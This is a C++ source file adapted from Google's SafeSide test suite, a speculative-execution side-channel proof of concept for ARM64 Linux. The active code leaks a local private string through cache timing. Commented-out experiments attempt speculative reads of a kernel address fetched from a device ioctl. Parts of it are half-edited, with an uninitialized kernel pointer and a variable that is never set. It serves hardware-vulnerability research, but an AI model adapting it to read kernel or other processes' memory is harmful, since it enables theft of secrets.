/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#include <fstream>
#include <sys/mman.h>
#include <fcntl.h>
#include <cstring>
#include <cstdlib>
#include <cerrno>
#include <ctime>


#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "meltdown_local_content.h"
#include "utils.h"
#include "common.h"

#define PAGE_SIZE 4096

#define DEVICE_NAME "/dev/my_device"
#define IOCTL_GET_ADDRESS _IOR('a', 1, unsigned long *)

void change_index(size_t * index){
  *index +=3;
  return;
}

static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_memory_addr, char *probe_array) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
  
  // kernel_memory_addr = hello;


  for (int run = 0;; ++run) {
    // kernel_memory_addr = hello + run;
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();
    size_t mod_data = x-3;
    // x = x-3;
    uint64_t mode;
    union sigval sig_data;
    sig_data.sival_ptr = &mod_data;
    

    // Flush the probe array from cache
    // for (int i = 0; i < 256; ++i) {
    //     serialized_flush(&probe_array[i * PAGE_SIZE]);
    // }

    // Architecturally access the safe offset.
    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));

    // Sends a SIGUSR1 signal to itself. The signal handler shifts the control
    // flow to the "afterspeculation" label.
    // We don't want to use the "syscall" library function in order to avoid
    // Spectre v2 effects that the CPU jumps over that call, because we cannot
    // serialize that later.
    // asm volatile(
    //     "mov x8, %0\n"              // Move syscall number (__NR_kill) into x8
    //     "mov x0, %1\n"              // Move process ID (getpid()) into x0
    //     "mov x1, %2\n"              // Move SIGUSR1 signal number into x1
    //     "svc #0\n"                  // Perform the syscall (kill)
    //     // "ldr w2, [%3]\n"            // Load my_var into register w2 (32-bit register for int)
    //     // "add w2, w2, #1\n"          // Add 5 to the value of w2 (increment by 5)
    //     // "str w2, [%3]\n"            // Store the modified value back into my_var
    //     :
    //     : "r"(__NR_kill), "r"(getpid()), "r"(SIGUSR1)//, "r"(&mod_data)
    //     : "x0", "x1", "x8"//, "w2"    // Clobbered registers
    // );
    // asm volatile(
    //     "mov x8, %0\n"           // System call number for rt_sigqueueinfo
    //     "mov x0, %1\n"           // Process ID (getpid)
    //     "mov x1, %2\n"           // Signal number (SIGUSR1)
    //     "mov x2, %3\n"           // Pointer to sigval (value)
    //     "svc #0\n"               // Make the system call
    //     :
    //     : "r"(129), "r"(getpid()), "r"(SIGUSR1), "r"(&sig_data)
    //     : "x0", "x1", "x2", "x8"
    // );
    // sigqueue(getpid(), SIGUSR1, sig_data);
    // mod_data++;  
    // asm volatile(
    //     "call my_label;"  // Call a label within the C function
    // );

    // asm volatile("my_label:");
    asm volatile ("mrs %0, CurrentEL" : "=r"(mode));
    mode = (mode >> 2) & 0b11;
      // change_index(&mod_data);

    // for(int i = 0; i< 100; i++){
    //   change_index(&mod_data);
    //   if(mod_data != x)
    //     asm volatile("b afterspeculation");
      
    //   mod_data = mod_data - 3;
    //   // if(i==98)
    //   //   mod_data++;

    // }
      // C function call at the label
    // asm volatile("ret");     // Assembly 'ret' to return from label

    
    // asm volatile(
    //     "ldr x0, [%[kernel_memory_addr]]\n"  // Speculative read from kernel address
    //     :
    //     : [kernel_memory_addr] "r"(kernel_memory_addr)
    //     : "x0"
    // );
    // volatile char dummy = *(volatile char*)kernel_memory_addr;
    // // printf("DUmmy: %d", dummy);
    // ForceRead(&probe_array[dummy * PAGE_SIZE]);

    // Unreachable code. Speculatively access the unsafe offset.
    // if((mode & 0b11) == 0b00)
      ForceRead(oracle.data() + static_cast<size_t>(data[(offset - x + mod_data % strlen(private_data))]));
    // ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
    std::cout << "Dead code. Must not be printed." << std::endl;
    

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGUSR1 signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");
    // std::cout<<"LOL"<<std::endl;

    int best_guess = -1;
    uint64_t best_time = 150;

    // for (int i = 0; i < 256; ++i) {
      
    //   uint64_t access_time = time_load(&probe_array[i * PAGE_SIZE]);
    //   // printf("Access Time : %ld\n ", access_time);
    //   if (access_time < best_time) {
    //       best_time = access_time;
    //       best_guess = i;
    //   }
    // }


    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);

    if (result.first) {
      return result.second;

    }

    
    if(best_guess != -1)
      return best_guess;

    if (run > 100000) {
      std::cout << "Does not converge " << std::endl;
      exit(EXIT_FAILURE);
    // return 97;
      // break;
    }
  }
}

int main() {
  // enable_pmu();
  OnSignalMoveRipToAfterspeculation(SIGUSR1);
  const size_t PROBE_ARRAY_SIZE = 256 * PAGE_SIZE;
  char *probe_array = (char *)mmap(NULL, PROBE_ARRAY_SIZE, PROT_READ | PROT_WRITE,
                                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (probe_array == MAP_FAILED) {
      std::cerr << "Failed to mmap probe array." << std::endl;
      return 1;
  }

  // int fd;
    unsigned long kernel_address;

  //   // Open the device
  //   fd = open(DEVICE_NAME, O_RDONLY);
  //   if (fd < 0) {
  //       perror("Failed to open the device");
  //       return -1;
  //   }

  //   // Get the kernel address via ioctl
  //   if (ioctl(fd, IOCTL_GET_ADDRESS, &kernel_address) == -1) {
  //       perror("Failed to get the address");
  //       close(fd);
  //       return -1;
  //   }

  //   close(fd);
   char *kernel_memory_addr = (char *)kernel_address;
    char hello[] = "1234567890jsenkjvk";
    // char* hello;
    // kernel_memory_addr = hello;
    std::cout << "Leaking the string: ";
    std::cout.flush();
  // while(kernel_memory_addr != ( char *)0xffffffffffffffff){
        // *(kernel_memory_addr);
  
    // std::cout << "Leaking the string: ";
    std::cout.flush();
    const size_t private_offset = private_data - public_data;
    for (size_t i = 0; i < strlen(private_data); ++i) {
      
      std::cout << LeakByte(public_data, private_offset+i, i, kernel_memory_addr, probe_array);
      std::cout.flush();
    // if((uint64_t)kernel_memory_addr % 8 ==0)
    //     std::cout<<std::endl;
    }

    // kernel_memory_addr++;
  // }
  
  std::cout << "\nDone!\n";
}
